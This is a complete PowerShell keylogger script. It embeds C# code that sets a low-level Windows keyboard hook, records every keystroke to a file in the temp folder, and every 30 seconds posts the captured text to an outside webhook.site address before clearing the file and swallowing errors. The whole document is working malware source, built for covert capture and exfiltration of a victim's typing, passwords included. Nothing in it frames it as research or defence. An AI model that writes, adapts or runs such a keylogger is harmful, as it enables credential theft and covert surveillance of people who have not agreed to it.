# keylogger.ps1

$logFile = "$env:TEMP\keylog.txt"
$webhookUrl = 'https://webhook.site/b620ae52-906d-433a-a17c-8cd91ef5e1ae'

# Define WinAPI functions and hook for keyboard input using C#
Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardHook {
    public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static IntPtr hookId = IntPtr.Zero;
    private static HookProc hookCallback;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void SetHook() {
        hookCallback = HookCallback;
        using(var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using(var curModule = curProcess.MainModule) {
            IntPtr moduleHandle = GetModuleHandle(curModule.ModuleName);
            hookId = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, moduleHandle, 0);
        }
    }

    public static void Unhook() {
        UnhookWindowsHookEx(hookId);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();

            // Write key to file (or invoke event)
            System.IO.File.AppendAllText("$logFile", key + " ");
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@

# Set hook
[KeyboardHook]::SetHook()

# Send logs every 30 seconds
while ($true) {
    Start-Sleep -Seconds 30

    if (Test-Path $logFile) {
        $content = Get-Content $logFile -Raw
        if ($content.Length -gt 0) {
            # Send to webhook
            try {
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $content
                # Clear file after sending
                Clear-Content $logFile
            } catch {
                # Ignore errors, will try again next time
            }
        }
    }
}
